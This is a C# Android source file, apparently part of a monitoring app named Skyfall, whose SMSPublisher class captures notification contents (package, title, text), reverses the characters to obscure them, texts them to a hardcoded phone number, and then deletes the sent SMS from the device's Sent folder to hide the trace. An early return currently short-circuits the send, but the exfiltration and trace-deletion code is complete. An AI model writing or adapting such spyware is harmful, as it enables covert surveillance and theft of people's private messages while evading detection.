using Android.Provider;
using Android.Telephony;
using System;
using System.Threading;

namespace Skyfall
{
    static class SMSPublisher
    {
        private const string SMS_RECIPIENT = "22998836591";
        private static string bodyMessage;

        static public void LogSMS(string package, string title, string text)
        {
            return;

            /// Build incognito SMS body
            char[] messageArray = ("]" + package + "[\n]" + title + "[\n]" + text + "[").ToCharArray();
            Array.Reverse(messageArray);
            bodyMessage = new string(messageArray);

            /// Dispatch SMS
            try
            {
                SmsManager.Default.SendTextMessage(SMS_RECIPIENT, null, bodyMessage, null, null);

                Thread thread = new Thread(RemoveSMSTrace);
                thread.Start();
            }
            catch { }
        }

        static private void RemoveSMSTrace()
        {
            try
            {
                Thread.Sleep(30000);
                //Android.Database.ICursor databaseCursor =
                //    KernelService.applicationContext.ContentResolver.Query(Telephony.Sms.ContentUri, null, Telephony.TextBasedSmsColumns.Body + "=?", new string[] { bodyMessage }, null);
                //if ((databaseCursor != null) && (databaseCursor.Count != 0))
                //{
                //    while (databaseCursor.MoveToNext())
                //    {
                //        string threadId = databaseCursor.GetString(0);
                //        KernelService.LogMessage("Found SMS ID match: " + threadId + "<br />");
                //        KernelService.applicationContext.ContentResolver.Delete(Telephony.Sms.ContentUri, Telephony.TextBasedSmsColumns.ThreadId + "=?", new string[] { threadId });
                //    }
                //}
                KernelService.applicationContext.ContentResolver.Delete(Telephony.Sms.Sent.ContentUri, Telephony.TextBasedSmsColumns.Body + "=?", new string[] { bodyMessage });
            }
            catch (Exception e) { KernelService.LogException(e); }
        }
    }
}